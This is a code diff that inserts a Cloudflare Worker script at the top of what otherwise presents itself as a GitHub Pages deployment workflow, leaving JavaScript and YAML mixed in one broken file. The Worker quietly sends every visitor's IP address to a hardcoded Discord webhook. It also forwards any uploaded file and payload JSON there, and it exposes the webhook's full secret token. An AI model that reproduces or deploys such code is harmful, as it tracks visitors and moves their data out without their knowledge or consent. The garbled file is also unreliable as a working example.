@@ -1,4 +1,51 @@
-# Simple workflow for deploying static content to GitHub Pages
+export default {
+  async fetch(request, env, ctx) {
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1518254992325349477/b2wiQmkba9SPDPedErCexidD8pBjpbqiySYTrYb6Ivzx1DG57Y-khcLqCt2X_vkF6VgI';
+    const corsHeaders = {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type',
+    };
+
+    if (request.method === 'OPTIONS') {
+      return new Response(null, { headers: corsHeaders });
+    }
+
+    try {
+      if (request.method === 'GET') {
+        const clientIP = request.headers.get('CF-Connecting-IP') || '0.0.0.0';
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: 'IP: ' + clientIP })
+        });
+        return new Response(JSON.stringify({ ip: clientIP }), {
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+
+      if (request.method === 'POST') {
+        const formData = await request.formData();
+        const file = formData.get('file');
+        const payloadJson = formData.get('payload_json');
+        if (file) {
+          const newFormData = new FormData();
+          newFormData.append('file', file);
+          if (payloadJson) newFormData.append('payload_json', payloadJson);
+          await fetch(DISCORD_WEBHOOK, { method: 'POST', body: newFormData });
+        }
+        return new Response('OK', { headers: corsHeaders });
+      }
+
+      return new Response('Metodo no permitido', { status: 405, headers: corsHeaders });
+    } catch (error) {
+      return new Response(JSON.stringify({ error: error.message }), {
+        status: 500,
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+      });
+    }
+  }
+};
 name: Deploy static content to Pages
 
 on:
